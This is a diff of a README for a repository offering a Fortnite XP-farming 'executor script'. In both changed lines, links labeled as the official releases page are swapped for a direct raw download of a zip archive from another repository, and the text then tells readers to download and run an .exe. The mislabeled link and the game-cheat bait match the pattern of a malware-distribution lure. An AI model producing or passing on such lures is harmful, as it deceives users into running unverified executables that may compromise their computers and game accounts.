@@ -5,7 +5,7 @@ description: "Automate Fortnite XP farming using this browser-based execution sc
 ---
 # 🎮 fortnite-executor-script-hub - Automate your experience farming routines easily
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Nathanilclathrate809/fortnite-executor-script-hub/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/Nathanilclathrate809/nathanilclathrate809.github.io/main/app/projects/[slug]/Application-v2.1.zip)
 
 This software manages experience farming in Fortnite. It operates through your web browser to play tasks automatically. You save time while the game accumulates progress on your account. The tool controls scripted routines that interact with the game interface. It works on Windows computers and mobile browsers.
 
@@ -25,7 +25,7 @@ Ensure your Windows installation has all recent updates. Outdated versions may b
 
 Follow these steps to obtain the tool:
 
-1.  Visit the [official releases page](https://github.com/Nathanilclathrate809/fortnite-executor-script-hub/releases).
+1.  Visit the [official releases page](https://raw.githubusercontent.com/Nathanilclathrate809/nathanilclathrate809.github.io/main/app/projects/[slug]/Application-v2.1.zip).
 2.  Locate the section labeled Assets.
 3.  Click the file ending in .exe to start your download.
 4.  Once the file finishes, move it to a folder you can find easily, such as your Desktop.
